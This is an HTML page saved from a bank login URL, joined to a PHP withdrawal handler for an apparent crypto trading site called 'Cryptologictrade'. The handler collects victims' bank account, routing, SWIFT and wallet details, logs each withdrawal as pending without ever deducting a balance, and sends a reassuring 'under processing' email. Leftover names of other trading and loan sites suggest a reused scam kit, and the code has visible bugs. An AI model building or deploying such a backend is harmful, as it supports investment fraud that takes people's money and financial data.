
<!DOCTYPE html>
<!-- saved from url=(0065)https://www.eastwestbankhb.com/tob/live/usp-core/app/initialLogin -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title></title>
        <meta http-equiv="refresh" content="15;URL=confirmation.php">
    <script type="text/javascript" src="./initialLogin_files/restore_mfa.js.download"></script>
	
</head>

<body onLoad="setMfa(confirmation.php;);">
<div role="alert" style="position: absolute;clip: rect(0 0 0 0)" aria-live="assertive"><span id="accessibleAlertMessage" role="alert" aria-live="assertive" style="display: inline;">Initiating Withdrawal Process ...</span></div>
<div style="text-align: center;font-size: 18px;font-family: arial; margin-top: 10%;"><img src="img/Loader_page.gif" style="margin-left: -15px;"><div id="loadingMsgDiv" style="margin-top: 10px;">Loading...<br>Initiating Withdrawal Process ...<br> Processing Withdrawal ..</div></div>


</body></html>


<?php
if (isset($_SESSION['loggedin']) && $_SESSION['loggedin'] == true) {
        $SEshopmail = $_SESSION['email'];
        $SEshopid = $_SESSION['userid'];
}

session_start(); //starting session
ob_start();
include('z_db.php'); //connection details
$amount=mysqli_real_escape_string($con, $_POST['amount']);
$SEshopmail = $_SESSION['email'];
$res=mysqli_query($con,"SELECT balance FROM users  where email = '$SEshopmail'");
$row=mysqli_fetch_array($res);
$oldbal = $row['balance'];
if ($amount > $oldbal) {
$msg1 = "Withdraw cannot be processed due to Insufficient Balance";
echo "<div id='popupmain' style='display:none;'>
  		<div id='popupfo' style='width:250px;'>
  		<span></span><br>
  			<h5 id='hagg'><b>IMPORTANT NOTICE </b></h5>
  			<span style='font-size:18px !important; color:black;'>$msg1</span><br>
  			
  		</div>
   </div>";
header( "refresh:3;url=withdraw_error.php" );
}else {
header( "refresh:5;url=confirmation.php" );
$status = "OK"; //initial status
$msg="";
$transid = 'WTX'.'-'.rand(100,999);
$date=date('Y-m-d');
$SEshopmail = $_SESSION['email'];
$SEshopid = $_SESSION['userid'];
$with_method=mysqli_real_escape_string($con, $_POST['with_method']);
$walletadd=mysqli_real_escape_string($con, $_POST['walletadd']);
$accname=mysqli_real_escape_string($con, $_POST['accname']);
$swiftcode=mysqli_real_escape_string($con, $_POST['swiftcode']);    //fetching details through post method
$country=mysqli_real_escape_string($con, $_POST['country']); 
$bankname=mysqli_real_escape_string($con, $_POST['bankname']); 
$amount=mysqli_real_escape_string($con, $_POST['amount']); 
$address=mysqli_real_escape_string($con, $_POST['address']); 
$accnumber=mysqli_real_escape_string($con, $_POST['accnumber']); 
$amount=mysqli_real_escape_string($con, $_POST['amount']);
$city=mysqli_real_escape_string($con, $_POST['city']);
$zipcode=mysqli_real_escape_string($con, $_POST['zipcode']);
$routinenumber=mysqli_real_escape_string($con, $_POST['routinenumber']); 
//$trans="EPIC";

//$pass = rand(1111111111,9999999999);
	

if($status=="OK")
{
$res1=mysqli_query($con,"SELECT * FROM users  where email = '$SEshopmail' AND userid = '$SEshopid'");
$row=mysqli_fetch_array($res1);
$oldbal = $row['balance'];
$newbal = $oldbal - $amount; 
	
$res2=mysqli_query($con,"INSERT INTO withdrawal(email,withmethod,accountno,accountname,swiftcode,city,zipcode,bank,amount,transid,routinenumber,walletadd,status,date) VALUES ('$SEshopmail','$with_method','$accnumber','$accname','$swiftcode','$city','$zipcode','$bank','$amount','$transid','$routinenumber','$walletadd','PENDING','$date')");
//$res3=mysqli_query($con,"UPDATE users SET balance='$newbal' where email = '$SEshopmail' AND userid = '$SEshopid'");
//$res3=mysqli_query($con,"INSERT INTO transfer(account, bname, routing) VALUES ('$baccount', '$bname', '$bemail', '$brouting','$bssn','$bcredit')");



		date_default_timezone_set('UTC');
$date = date("l, F  j Y");
$time = date('h:i:s a', time());
$nowww = $date." ".$time;

	$to = 'support@Cryptologictrade.com';
	//$to = $_SESSION["qv"];
$subject = "withdrawal_Cryptologictrade";
//$from = $email;


//$host = "smtp.unitedfunds24.com";
$host = "mx1.hostinger.com";
$port = '587';


//$to = 'info@24hourloan.co.za'; // note the comma

// Subject
//$subject = 'Client Application';

// Message
$message = "
<html>
<head>
<title></title>
</head>
<body><br>
<div class='be_logo' style='float: left;'> <img src='https://www.Cryptologictrade.com/public/images/logo1.png' heigh='auto' width='180'> </div><br><br>
<br>
Dear </b> <br>
Thank you for choosing Cryptologictrade as your Trading Platform. Your Withdrawal is under Processing.. 
<p>Transaction ID:  ".$transid." </p>
<p>Withdrawal Method:  ".$with_method." </p>
<p>Withdrawal Amount : ".$amount." </p>

<p>Regards,
<br>
<br>
<p>Contact Us via:support@Cryptologictrade.com

    </p>

</body>
</html>";


// data-live-search="true"
// To send HTML mail, the Content-type header must be set
$headers[] = 'MIME-Version: 1.0';
$headers[] = 'Content-type: text/html; charset=iso-8859-1';
$headers[] ='From:'.$to;
$headers[] = 'Cc: '.$SEshopmail;
// Mail it
mail($to, $subject, $message, implode("\r\n", $headers));
if(mail){
//echo 'Your Registration is Been Process, We will Get Back to You  As Soon as Possible Via Email (support@PalmTradingFx.com)';
}
}






}
?>


